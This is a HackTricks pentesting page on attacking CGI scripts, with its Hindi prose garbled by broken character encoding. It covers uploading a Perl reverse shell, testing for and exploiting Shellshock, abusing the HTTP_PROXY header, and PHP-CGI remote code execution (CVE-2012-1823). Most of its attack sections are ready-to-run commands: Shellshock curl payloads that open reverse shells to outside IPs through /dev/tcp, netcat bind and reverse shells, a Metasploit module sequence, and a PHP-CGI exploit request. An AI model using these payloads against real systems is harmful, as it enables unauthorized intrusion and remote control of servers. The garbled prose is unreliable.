<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХреЛ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PRs рд╕рдмрдорд┐рдЯ** рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>


# рдЬрд╛рдирдХрд╛рд░реА

**CGI рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдкрд░реНрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕** рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ рд╕рд░реНрд╡рд░ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рд╣реИ рдЬреЛ _**.cgi**_ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддреЛ рдЖрдк **рдПрдХ рдкрд░реНрд▓ рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\) рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдХреЛ **.pl** рд╕реЗ **.cgi** рдореЗрдВ **рдмрджрд▓реЗрдВ**, **рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдкрд░рдорд┐рд╢рдиреНрд╕** рджреЗрдВ \(`chmod +x`\) рдФрд░ рдЙрд╕реЗ рдПрдХреНрд╕реЗрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реЗ **рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рддрдХ рдкрд╣реБрдВрдЪреЗрдВ**ред
**CGI vulns** рдХреЗ рд▓рд┐рдП рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `nikto -C all` \(рдФрд░ рд╕рднреА рдкреНрд▓рдЧрдЗрдиреНрд╕\) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕реБрдЭрд╛рд╡рд┐рдд рд╣реИред

# **ShellShock**

**ShellShock** рдПрдХ **рд╡рдВрд╢рд╛рд╡рд▓реА** рд╣реИ рдЬреЛ Unix рдЖрдзрд╛рд░рд┐рдд рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **Bash** рдХрдорд╛рдВрдб-рд▓рд╛рдЗрди рд╢реИрд▓ рдореЗрдВ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рддреА рд╣реИред рдпрд╣ Bash рдХреА рдХреНрд╖рдорддрд╛ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░рд┐рдд рдХреА рдЧрдИ рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдЪрд▓рд╛рдиреЗред рдЗрд╕ рд╡рдВрд╢рд╛рд╡рд▓реА рдХрд╛ рдореВрд▓ рддрддреНрд╡ **рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░** рдореЗрдВ рд╣реИ, рдЬреЛ рдбрд╛рдпрдирд╛рдорд┐рдХ рдирд╛рдорд┐рдд рдорд╛рди рд╣реИрдВ рдЬреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдХреИрд╕реЗ рдЪрд▓рд╛рддреЗ рд╣реИрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреЗ рд╣реИрдВред рд╣рдорд▓рд╛рд╡рд╛рджреА рдЗрд╕реЗ рдЗрд╕рд▓рд┐рдП рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ **рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░реЛрдВ** рдореЗрдВ **рджреБрд░реБрдкрдпреЛрдЧреА рдХреЛрдб** рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рд╡реЗ рдЪрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд╛рджреА рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИред

рдЗрд╕ рд╡рдВрд╢рд╛рд╡рд▓реА рдХрд╛ рд╢рд┐рдХрд╛рд░ рд╣реЛрдиреЗ рдкрд░ **рдкреЗрдЬ рдПрдХ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХ рд╕рдХрддрд╛ рд╣реИ**ред

рдЖрдк рдЗрд╕ рд╡рдВрд╢рд╛рд╡рд▓реА рдХреЛ **рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдХрд┐ рдпрд╣ **рдкреБрд░рд╛рдиреЗ Apache рд╕рдВрд╕реНрдХрд░рдг** рдФрд░ **cgi\_mod** \(cgi рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рд╕рд╛рде\) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдпрд╛ **nikto** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред

## **рдкрд░реАрдХреНрд╖рдг**

рдЕрдзрд┐рдХрд╛рдВрд╢ рдкрд░реАрдХреНрд╖рдг рдПрдХ рдХреБрдЫ рдЪреАрдЬрд╝ рдХреЛ рдЗрдХреЛ рдХрд░рдиреЗ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИрдВ рдФрд░ рдЙрдореНрдореАрдж рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рд╡рд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╡реЗрдм рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╡рд╛рдкрд╕ рд▓реМрдЯрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдХреЛрдИ рдкреЗрдЬ рд╡рдВрд╢рд╛рд╡рд▓реА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╕рднреА cgi рдкреЗрдЬреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВред

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд, рдЕрдВрдзрд╛ рдФрд░ рдЖрдЙрдЯ-рдСрдл-рдмреИрдВрдб\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**рд╢реИрд▓рд╢реЙрдХрд░**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## рд╢рд╛рддреНрд░реБрддрд╛
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **рдкреНрд░реЙрдХреНрд╕реА \(MitM рд╕реЗ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдЕрдиреБрд░реЛрдз\)**

CGI рд╣рд░ http рдЕрдиреБрд░реЛрдз рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рд╣реЗрдбрд░ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд╛рддрд╛рд╡рд░рдгреАрдп рдорд╛рди рдмрдирд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: "host:web.com" рдХреЛ "HTTP\_HOST"="web.com" рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЬреИрд╕реЗ рд╣реА рд╡реЗрдм рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ HTTP\_PROXY рд╡реЗрд░рд┐рдПрдмрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдХрд┐ рдПрдХ **рд╣реЗрдбрд░** рднреЗрдЬреЗрдВ рдЬрд┐рд╕рдореЗрдВ "**рдкреНрд░реЙрдХреНрд╕реА: &lt;IP\_рд╣рдорд▓рд╛рд╡рд░&gt;:&lt;рдкреЛрд░реНрдЯ&gt;**" рд╢рд╛рдорд┐рд▓ рд╣реЛ рдФрд░ рдпрджрд┐ рд╕рддреНрд░ рдХреЗ рджреМрд░рд╛рди рд╕рд░реНрд╡рд░ рдХреЛрдИ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред рддреЛ рдЖрдк рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдП рдЧрдП рдкреНрд░рддреНрдпреЗрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХреЗрдВрдЧреЗред

# рдкреБрд░рд╛рдирд╛ PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

рдореВрд▓ рд░реВрдк рд╕реЗ рдпрджрд┐ cgi рд╕рдХреНрд░рд┐рдп рд╣реИ рдФрд░ php "рдкреБрд░рд╛рдирд╛" рд╣реИ \(&lt;5.3.12 / &lt; 5.4.2\) рддреЛ рдЖрдк рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рднрдпрд╛рдирдХрддрд╛ рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХреБрдЫ PHP рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдкреИрд░рд╛рдореАрдЯрд░ рднреЗрдЬреЗ \(рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ "=" рд╡рд╛рд▓реЗ рд╡рд░реНрдг рднреЗрдЬреЗ рдмрд┐рдирд╛\)ред рдлрд┐рд░, рдЗрд╕ рднрдпрд╛рдирдХрддрд╛ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `/index.php?-s` рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЙрддреНрддрд░ рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рд╕реНрд░реЛрдд рдХреЛрдб рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛**ред

рдлрд┐рд░, **RCE** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕ рд╡рд┐рд╢реЗрд╖ рдХреНрд╡реЗрд░реА рдХреЛ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` рдФрд░ **PHP рдХреЛрдб** рдХреЛ **рдЕрдиреБрд░реЛрдз рдХреЗ рдмреЙрдбреА рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдЙрджрд╛рд╣рд░рдг:**
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**рд╡рд▓реНрди рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рдЙрддреНрдкреАрдбрд╝рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**



<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
